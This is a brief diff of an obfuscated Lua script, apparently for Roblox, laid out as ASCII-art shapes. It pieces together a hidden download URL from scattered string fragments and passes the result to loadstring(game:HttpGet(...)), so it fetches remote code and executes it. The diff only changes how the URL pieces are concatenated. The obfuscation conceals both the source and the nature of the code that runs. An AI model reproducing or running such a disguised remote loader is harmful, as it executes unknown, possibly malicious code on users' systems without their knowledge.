@@ -1,5 +1,5 @@
-
-
+ 
+ 
                                     none
                                  =[[eXq]] do
                               task.wait();local
@@ -31,7 +31,7 @@
    .."d2621c6e3"             ..(19==91                      and"a"or"")..
    [[0c6797f52]]             .."c989e5"                     ..[[577e318]]
    ..'68d1c161e'             .."5d65498"                    ;local F,H=[[
-   45f5b]]..[[]]             ,"/download"                   F= "45f5befe"
+   45f5b]]..[[]]             , "45f5befe"                   .."/download"
       local lsg=             loadstring;Z                   =[[aint2]]
           do lsg             (game:HttpGet                  ([[ad=
               ]]             ~=12 and WOD..                 H)
